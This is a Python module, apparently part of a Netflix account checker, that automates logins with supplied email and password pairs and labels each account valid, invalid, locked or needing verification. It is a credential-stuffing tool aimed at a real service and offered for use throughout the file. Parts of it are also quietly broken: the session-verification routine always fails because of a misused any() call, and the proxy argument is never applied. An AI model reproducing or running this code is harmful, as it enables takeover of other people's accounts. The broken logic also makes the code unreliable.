"""
Netflix Login Handler - Netflix API Interaction Layer
"""
import asyncio
import json
import re
from typing import Dict, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

import aiohttp

from checker_utils import get_random_user_agent


class AccountStatus(Enum):
    VALID = "valid"
    INVALID = "invalid"
    LOCKED = "locked"
    CHALLENGE = "challenge"
    ERROR = "error"


@dataclass
class LoginResult:
    status: AccountStatus
    message: str
    details: Optional[Dict] = None


class NetflixLogin:
    """Handles Netflix authentication flow"""

    BASE_URL = "https://www.netflix.com"
    API_URL = "https://www.netflix.com/api"
    LOGIN_URL = f"{BASE_URL}/login"
    ACT_URL = f"{API_URL}/shakti/-"
    BUILD_IDENTIFIER = "20231106-rc.08"

    def __init__(self, timeout: int = 30):
        self.timeout = timeout
        self.session: Optional[aiohttp.ClientSession] = None
        self.csrf_token: Optional[str] = None
        self.auth_url: Optional[str] = None

    async def __aenter__(self):
        await self._init_session()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()

    async def _init_session(self):
        """Initialize HTTP session with proper headers"""
        headers = {
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
        }
        self.session = aiohttp.ClientSession(
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            cookie_jar=aiohttp.CookieJar()
        )

    async def close(self):
        """Close the session"""
        if self.session:
            await self.session.close()

    async def _get_csrf_token(self) -> bool:
        """Fetch login page to get CSRF token"""
        try:
            async with self.session.get(self.LOGIN_URL, allow_redirects=True) as response:
                html = await response.text()

                # Extract CSRF token from the page
                csrf_match = re.search(r'name="csrfToken"\s+value="([^"]+)"', html)
                if csrf_match:
                    self.csrf_token = csrf_match.group(1)
                    return True

                # Also check in JavaScript
                csrf_match = re.search(r'csrfToken["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
                if csrf_match:
                    self.csrf_token = csrf_match.group(1)
                    return True

                return False

        except Exception as e:
            return False

    async def _build_auth_url(self) -> bool:
        """Build the authentication URL with build identifier"""
        try:
            url = f"{self.BASE_URL}/browse"
            async with self.session.get(url, allow_redirects=False) as response:
                location = response.headers.get("Location", "")

                # Netflix uses various auth endpoints
                if "netflix.com" in location:
                    # Extract auth URL components
                    self.auth_url = location
                    return True

                return True  # Continue anyway

        except Exception:
            pass

        return True

    async def attempt_login(self, email: str, password: str, proxy: Optional[str] = None) -> LoginResult:
        """
        Attempt to login to Netflix with provided credentials

        Returns:
            LoginResult with status and details
        """
        try:
            # Get CSRF token first
            if not await self._get_csrf_token():
                # Try to continue without CSRF
                pass

            # Prepare login payload
            login_data = {
                "userLoginId": email,
                "password": password,
                "rememberMe": "true",
                "flow": "websiteSignUp",
                "mode": "login",
            }

            if self.csrf_token:
                login_data["csrfToken"] = self.csrf_token

            # Add headers for JSON request
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": self.LOGIN_URL,
                "Origin": self.BASE_URL,
            }

            # Make login request
            async with self.session.post(
                self.LOGIN_URL,
                data=login_data,
                headers=headers,
                allow_redirects=False
            ) as response:
                status = response.status
                location = response.headers.get("Location", "")
                cookies = response.cookies

                # Check response
                if status == 302 or status == 303:
                    # Check for redirect to success page
                    if "browse" in location or "youraccount" in location or "profiles" in location:
                        # Get cookies and verify session
                        if await self._verify_session(cookies):
                            return LoginResult(
                                status=AccountStatus.VALID,
                                message="Login successful - valid account",
                                details={"email": email}
                            )

                    # Check for locked account response
                    if "locked" in location.lower() or "unusual" in location.lower():
                        return LoginResult(
                            status=AccountStatus.LOCKED,
                            message="Account appears to be locked",
                            details={"email": email}
                        )

                # Check response body for error messages
                response_text = await response.text()
                response_lower = response_text.lower()

                # Check for specific error patterns
                if "incorrect" in response_lower or "wrong" in response_lower:
                    return LoginResult(
                        status=AccountStatus.INVALID,
                        message="Incorrect password or email",
                        details={"email": email}
                    )

                if "does not match" in response_lower or "find your account" in response_lower:
                    return LoginResult(
                        status=AccountStatus.INVALID,
                        message="Account not found",
                        details={"email": email}
                    )

                if "too many" in response_lower or "rate" in response_lower:
                    return LoginResult(
                        status=AccountStatus.LOCKED,
                        message="Too many attempts - rate limited",
                        details={"email": email}
                    )

                if "challenge" in response_lower or "verify" in response_lower:
                    return LoginResult(
                        status=AccountStatus.CHALLENGE,
                        message="Account requires additional verification",
                        details={"email": email}
                    )

                # Try to extract error from JSON response
                try:
                    # Check if it's JSON
                    if response.content_type == "application/json":
                        json_data = await response.json()
                        if "error" in json_data or "message" in json_data:
                            error_msg = json_data.get("error", json_data.get("message", ""))
                            if "incorrect" in error_msg.lower() or "wrong" in error_msg.lower():
                                return LoginResult(
                                    status=AccountStatus.INVALID,
                                    message=error_msg,
                                    details={"email": email}
                                )
                except (ValueError, aiohttp.ClientError):
                    pass

                # Default: if we got redirected somewhere unexpected, check cookies
                if cookies:
                    # Try to verify with cookies
                    if await self._verify_session(cookies):
                        return LoginResult(
                            status=AccountStatus.VALID,
                            message="Login successful - valid account",
                            details={"email": email}
                        )

                # If we have auth URL, follow it
                if location and "http" in location:
                    async with self.session.get(location, allow_redirects=False) as follow_response:
                        if follow_response.cookies:
                            if await self._verify_session(follow_response.cookies):
                                return LoginResult(
                                    status=AccountStatus.VALID,
                                    message="Login successful - valid account",
                                    details={"email": email}
                                )

                return LoginResult(
                    status=AccountStatus.ERROR,
                    message=f"Unexpected response: {status}",
                    details={"email": email, "status_code": status}
                )

        except asyncio.TimeoutError:
            return LoginResult(
                status=AccountStatus.ERROR,
                message="Request timeout",
                details={"email": email}
            )
        except aiohttp.ClientError as e:
            return LoginResult(
                status=AccountStatus.ERROR,
                message=f"Connection error: {str(e)}",
                details={"email": email}
            )
        except Exception as e:
            return LoginResult(
                status=AccountStatus.ERROR,
                message=f"Unexpected error: {str(e)}",
                details={"email": email}
            )

    async def _verify_session(self, cookies) -> bool:
        """Verify if the session is valid by checking Netflix session cookies"""
        try:
            # Check for Netflix session cookies
            cookie_dict = dict(cookies) if cookies else {}

            # Netflix sets these cookies on successful login
            required_cookies = ["nfvdid", "NetflixId", "SecureNetflixId"]

            # At least one should exist
            has_session = any(
                any(c in cookie_dict for c in required_cookies)
            )

            if not has_session:
                return False

            # Try to access a protected page
            async with self.session.get(
                f"{self.BASE_URL}/YourAccount",
                allow_redirects=True,
                cookies=cookies
            ) as response:
                # If we can access account page, session is valid
                return response.status == 200

        except Exception:
            return False


async def test_login(email: str, password: str, timeout: int = 30, proxy: Optional[str] = None) -> LoginResult:
    """Test login with given credentials"""
    async with NetflixLogin(timeout=timeout) as netflix:
        return await netflix.attempt_login(email, password, proxy)
